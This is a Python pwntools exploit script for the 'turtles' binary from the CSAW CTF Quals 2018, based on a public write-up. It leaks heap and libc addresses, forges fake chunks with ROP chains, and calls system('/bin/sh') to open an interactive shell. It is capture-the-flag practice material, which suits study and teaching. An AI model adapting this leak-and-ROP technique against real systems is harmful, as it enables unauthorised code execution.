# This exploit is based off of: https://jkrshnmenon.wordpress.com/2018/09/17/csaw-ctf-quals-2018-turtles-writeup/

from pwn import *

# Establish the target
#target = remote('pwn.chal.csaw.io', 9003)
target = process('./turtles', env={"LD_PRELOAD":"./libc.so.6"})
gdb.attach(target, gdbscript='b *0x400c8a')

# Establish the binaries so we can get symbols
elf = ELF('./turtles')
libc = ELF('libc.so.6')

# Establish the needed ROP gadgets & addresses
popRegisters = p64(0x400d3a) # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
popRdi = p64(0x400d43) # pop rdi ; ret

pltPrintf = p64(elf.plt['printf'])
gotPrintf = p64(elf.got['printf'])
gotRead = p64(elf.got['read'])

main = p64(0x400b84)

# Scan in and parse out the address of the turtle object
def initalTurtle():
	print target.recvuntil('Here is a Turtle: ')
	leak = target.recvline()
	leak.replace('\x0a', '')
	leak = int(leak, 16)
	log.info('The leak is: ' + hex(leak))
	return leak

leak = initalTurtle()

# Establish the first ROP Chain for the printf infoleak
chain0 = ""
chain0 += popRdi
chain0 += gotPrintf
chain0 += pltPrintf
chain0 += main

# Establish the first fake chunk
chunk = fit({0: p64(leak),
			 0x8: p64(leak+0x10),
			 0x10: popRegisters,
			 0x18: popRegisters,
			 0x28: p64(0x0),
			 0x40: p64(leak),
			 0x50: chain0}, length=0x100)

# Send the fake chunk
target.sendline(chunk)

# Scan in the libc address of printf, then calculate the address of libc base and system
libcPrintf = u64(target.recv(6) + "\x00\x00")
libcBase = libcPrintf - libc.symbols['printf']
libcSystem = libcBase + libc.symbols['system']
log.info("Address of printf: " + hex(libcPrintf))
log.info("Address of system: " + hex(libcSystem))
log.info("Address of libc base: " + hex(libcBase))

# Get the infoleak for the new turtle object
leak = initalTurtle()

# Establish the second ROP Chain to call System
chain1 = ""
chain1 += popRdi
chain1 += p64(leak + 0x48)
chain1 += p64(libcSystem)

# Establish the second fake chunk
chunk = fit({0: p64(leak),
			 0x8: p64(leak+0x10),
			 0x10: popRegisters,
			 0x18: popRegisters,
			 0x28: p64(0x0),
			 0x40: p64(leak),
			 0x48: '/bin/sh\x00',
			 0x50: chain1}, length=0x100)

# Send the second fake chunk
target.sendline(chunk)

# Drop to an interactive shell to use our new shell
target.interactive()

